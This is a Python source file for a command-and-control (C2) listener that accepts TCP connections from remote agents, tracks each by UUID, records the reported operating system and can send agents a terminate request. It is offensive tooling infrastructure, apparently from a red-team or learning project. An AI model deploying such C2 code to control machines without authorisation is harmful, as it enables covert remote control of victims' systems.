import socket
from uuid import uuid4

from threading import Thread

from agent.protocol import ProtocolSession, SystemInfoFrame, DieRequestFrame


class Agent:
    session: ProtocolSession
    uuid: uuid4
    os: str

    def __init__(self, uuid: uuid4, session: ProtocolSession):
        self.session = session
        self.uuid = uuid
        self.os = "Unknown"

    @property
    def address(self) -> str:
        return self.session.address[0]

    def die(self):
        self.session.send(DieRequestFrame())


class C2:
    agents: dict[uuid4, Agent]
    __listen: bool
    __thread: Thread
    __socket: socket.socket
    __address: tuple[str, int]

    def __init__(self, address):
        self.agents = {}
        self.__address = address

    def listen(self):
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__socket.settimeout(0.1)
        self.__socket.bind(self.__address)
        self.__socket.listen(5)
        print("C2 listener started")
        while self.__listen:
            try:
                sock, peer = self.__socket.accept()
            except socket.timeout:
                continue
            session = ProtocolSession(sock)

            uuid = uuid4()
            agent = SessionAgent(uuid, session)
            self.agents[uuid] = agent

            def run():
                session.run()
                self.agents.pop(uuid)

            Thread(target=run, daemon=True).start()

    def __enter__(self):
        self.__listen = True
        self.__thread = Thread(target=self.listen)
        self.__thread.start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.__listen = False
        if self.__thread is not None:
            self.__thread.join()
        if self.__socket is not None:
            self.__socket.close()


def SessionAgent(uuid: uuid4, session: ProtocolSession) -> Agent:

    agent = Agent(uuid, session)

    @session.handler(SystemInfoFrame)
    def handle(frame: SystemInfoFrame, _):
        agent.os = frame.system

    return agent
